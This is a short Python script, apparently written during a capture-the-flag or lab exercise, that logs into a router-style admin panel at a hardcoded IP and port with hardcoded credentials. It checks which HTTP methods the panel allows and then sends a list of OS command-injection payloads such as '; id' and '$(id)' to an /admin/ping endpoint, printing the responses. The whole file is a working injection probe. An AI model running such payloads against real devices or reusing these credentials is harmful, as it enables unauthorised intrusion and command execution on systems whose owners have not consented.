#!/usr/bin/env python3
import requests

URL = "http://154.57.164.66:30817"
AUTH = ("admin", "router123")

# Check OPTIONS to see allowed methods
print("=== OPTIONS /admin ===")
r = requests.options(f"{URL}/admin", auth=AUTH, timeout=5)
print(f"Status: {r.status_code}")
print(f"Allow: {r.headers.get('Allow', 'N/A')}")

# Let me also try POST to /admin/ping with command injection directly
print("\n=== Testing command injection on /admin/ping ===")
payloads = [
    {"ip": "127.0.0.1"},
    {"ip": "; id"},
    {"ip": "$(id)"},
    {"ip": "| id"},
    {"ip": "`id`"},
]
for p in payloads:
    r = requests.post(f"{URL}/admin/ping", auth=AUTH, data=p, timeout=5)
    print(f"Payload {p['ip'][:20]}: {r.status_code}")
    if "Error" not in r.text and "Not Found" not in r.text:
        print(r.text[:300])